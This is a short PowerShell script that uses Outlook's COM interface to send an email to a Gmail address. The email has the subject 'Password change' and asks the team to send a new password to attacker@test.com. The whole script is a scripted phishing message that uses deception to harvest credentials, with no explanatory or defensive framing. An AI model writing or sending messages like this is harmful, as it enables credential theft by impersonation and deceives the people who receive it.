$outlook = new-object -comobject outlook.application

$email = $outlook.CreateItem(0)
$email.To = "biostar1020@gmail.com"
$email.Subject = "Password change"
$email.Body = "Dear team send the new password to the following email attacker@test.com"

$email.Send()
$outlook.Quit()
